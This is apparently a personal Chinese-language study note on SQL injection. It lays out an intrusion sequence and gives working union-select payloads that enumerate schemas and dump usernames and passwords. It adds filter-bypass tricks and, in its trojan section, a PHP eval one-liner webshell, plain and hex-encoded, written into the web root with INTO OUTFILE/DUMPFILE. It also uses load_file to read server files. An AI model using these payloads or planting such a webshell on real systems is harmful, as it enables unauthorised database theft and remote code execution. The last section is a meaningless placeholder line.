#SQL注入 #

#### 2018/9/11 10:48:55   ####
----------

1. ## 入侵顺序 ##
	1.  查看所有信息 
	2.  查看字段数
	3.  查看数据库名，版本号，用户，所有表
	4.  上传一句话木马和下载数据（须知道webshell路径）

1. ## "-- " ##
	杠杠空格，是三个字符，实现注释后面代码，空格不能忘

1. ## ' 和 1 ##
	' 单引号和 1 实现检测字符或数字型参数

1. ## and ##
	and 1=1 和and 1=2 为了 测试后面能否接语句（有无注入点）

1. ## or ##
	or 1=1 可实现显示所有select信息

1. ## order by ##
	or 1=1 可实现显示所有select信息

	当order by 被过滤后就可以使用into 变量来绕过，后面变量个数 

    	select * from yz limit 1,1 into @a,@b,@c;

1. ## union ##
	false表达式+union select

    	id=-1 union select 1,2,3 
	看出现1,2,3中的那些数据，便知道那几个位置的数据可以显示出来，然后查别的数据

	union可用1||代替

1. ## 查看数据库 ##
	union select 1,version(),database()

1. ## 查选表名，列名 ##
	`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`

	`id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'`

1. ## 查看数据库内容 ##
	id=-1 union select 1,group_concat(username,password),3 from users

1. ## information_schema ##
    	select group_concat(schema_name) from information_schema.schemata
    	select schema_name from information_schema.schemata limit 0,1  #查询数据库
    	select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
    	select column_name from information_schema.columns where table_name='users' limit 0,1;  #查询列


1. ## 绕过 ##

	*From [cnblogs详细绕过技巧，以下为部分需求整合资料](https://www.cnblogs.com/Vinson404/p/7253255.html "绕过技巧")*

	*From [csdn详细绕过技巧，以下为部分需求整合资料](https://blog.csdn.net/qq_31481187/article/details/59727015 "绕过技巧")*

	#### * 注释符 ####
    	select 1,2,3 from yz where '1'/1=(1=1)/'1'='1' 
	(1=1)中就有了判断位为下面的注入打下基础

	#### * or and xor not ####
	and=&&  or=||   xor=|   not=!

	#### * 等于号 ####
	使用like 、rlike 、regexp 或者 使用< 或者 >

	#### * 空格 ####
	两个空格代替一个空格，用Tab代替空格，%a0=空格：

    	%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/


	括号代替

    	select(user())from dual where(1=1)and(2=2)

	#### * 引号 ####
	16位hex编码

	`select column_name  from information_schema.tables where table_name="users"`


	改为


	`select column_name  from information_schema.tables where table_name=0x7573657273``

	#### * 逗号 ####
	在***使用盲注***的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：

    	select substr(database() from 1 for 1);
    	select mid(database() from 1 for 1);

	***使用join***：

	`	union select 1,2`     


	`union select * from (select 1)a join (select 2)b`

	***使用like***：

	`select ascii(mid(user(),1,1))=80`

	`select user() like 'r%'`

	***对于limit***可以使用offset来绕过：

	`select * from news limit 0,1`

	`select * from news limit 1 offset 0`


1. ## 木马 ##
	**注意**：这里使用DUMPFILE文件写入，是因为outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成\'；load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\。故选用dumpfile文件写入木马
	
	**一句话木马**：  
	<?php @eval($_POST[zhangshu])?>  
	hex加码  
	3c3f70687020406576616c28245f504f53545b7a68616e677368755d293f3e

	dumpfile等文件写入语法  
	`select 'a\naa\raaaa' into dumpfile '/tmp/test.txt'`

	故可以通过以下方法上传一句话木马  
	`1；Create TABLE a (cmd text NOT NULL); Insert INTO a (cmd) VALUES('<?php eval($_POST[cmd])?>'); select cmd from a into outfile 'x:/phpMyAdmin/libraries/d.php'; Drop TABLE IF EXISTS a;` 
	或
	`-1' UNION ALL SELECT 0x3c3f70687020406576616c28245f504f53545b7a68616e677368755d293f3e,NULL INTO DUMPFILE '/var/www/html/zhangshu/t2.php'-- `

	<font color=#DC143C size=4 face="黑体">**此处会报错(仍未解决)：**</font>  
	`The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
	即`--secure-file-priv`问题  
	需通过sql终端输入`show variables like '%secure%';`处理  
	**若无法获得终端则无法上传木马**  
	若可以查到--secure-file-priv值，此值为可以上传的文件路径，若此路径不为webapps执行目录，需修改my.ini配置文件中secure设置  

	通常--secure-file-priv默认为/var/lib/mysql-files/

	注：可通过以下方法查看文件内容  
	`-6' UNION ALL SELECT NULL,load_file('/var/lib/mysql-files/t3.php') -- `
	
	注：linux通常web路径为：/var/www/html/index.html



1. ## 学习点3 ##
	内容湿哒哒大多数


